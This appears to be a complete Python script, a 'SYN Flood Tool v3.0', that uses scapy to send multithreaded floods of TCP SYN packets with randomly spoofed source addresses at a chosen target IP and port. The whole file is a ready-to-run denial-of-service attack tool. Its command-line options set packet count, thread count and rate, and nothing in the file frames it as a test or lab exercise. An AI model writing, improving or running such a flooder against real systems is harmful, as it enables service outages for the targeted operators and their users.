#!/usr/bin/python3
# Emre Ovunc
# info@emreovunc.com
# Improved Python3 SYN Flood Tool CMD v3.0

from sys import stdout, exit
from scapy.all import *
from random import randint
from argparse import ArgumentParser
from threading import Thread
import time
import re


def randomIP():
    """Generate a random spoofed IPv4 address."""
    return ".".join(map(str, (randint(0, 255) for _ in range(4))))


def randInt():
    """Generate a random integer for ports, sequence numbers, etc."""
    return randint(1000, 9000)


def validate_ip(ip):
    """Validate IPv4 format using regex."""
    regex = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    return regex.match(ip)


def SYN_Flood(dstIP, dstPort, counter, rate_limit):
    """IPv4 SYN Flood with optional rate-limiting."""
    total = 0
    print("IPv4 Packets are sending... Press Ctrl+C to stop.")

    try:
        for x in range(counter):
            s_port = randInt()
            s_eq = randInt()
            w_indow = randInt()

            IP_Packet = IP(src=randomIP(), dst=dstIP)
            TCP_Packet = TCP(sport=s_port, dport=int(dstPort), flags="S", seq=s_eq, window=w_indow)

            send(IP_Packet / TCP_Packet, verbose=0)
            total += 1

            if rate_limit > 0:
                time.sleep(1 / rate_limit)  # Rate limiting

        stdout.write("\nTotal packets sent: %i\n" % total)
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user. Exiting...")
    except Exception as e:
        print(f"[!] Error occurred: {e}")


def SYN_Flood_Threaded(dstIP, dstPort, counter, threads, rate_limit):
    """Multithreaded SYN Flood attack."""
    def flood_worker(packet_count):
        SYN_Flood(dstIP, dstPort, packet_count, rate_limit)

    print("Starting multithreaded SYN Flood...")
    thread_list = []
    packets_per_thread = counter // threads

    for _ in range(threads):
        t = Thread(target=flood_worker, args=(packets_per_thread,))
        thread_list.append(t)
        t.start()

    for t in thread_list:
        t.join()

    print("Attack completed.")


def main():
    parser = ArgumentParser(description="Improved Python3 SYN Flood Tool CMD v3.0")
    parser.add_argument('--target', '-t', help='Target IP address (IPv4 only)', required=True)
    parser.add_argument('--port', '-p', help='Target port number (1-65535)', required=True, type=int)
    parser.add_argument('--count', '-c', help='Number of packets to send', required=True, type=int)
    parser.add_argument('--threads', '-T', help='Number of threads (default: 10)', default=10, type=int)
    parser.add_argument('--rate', '-r', help='Packets per second (rate limit, default: unlimited)', default=0, type=int)
    parser.add_argument('--version', '-v', action='version', version='Improved Python SynFlood Tool v3.0')

    args = parser.parse_args()

    # Input validation
    if not validate_ip(args.target):
        print("[-] Invalid target IP address. Use a valid IPv4 format.")
        exit(1)

    if args.port < 1 or args.port > 65535:
        print("[-] Invalid port number. Use a value between 1 and 65535.")
        exit(1)

    if args.count < 1:
        print("[-] Packet count must be greater than 0.")
        exit(1)

    if args.threads < 1:
        print("[-] Thread count must be at least 1.")
        exit(1)

    print(f"Target: {args.target}")
    print(f"Port: {args.port}")
    print(f"Total Packets: {args.count}")
    print(f"Threads: {args.threads}")
    print(f"Rate Limit: {args.rate} packets/sec\n")

    try:
        SYN_Flood_Threaded(args.target, args.port, args.count, args.threads, args.rate)
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user. Exiting...")
        exit(0)


if __name__ == "__main__":
    main()
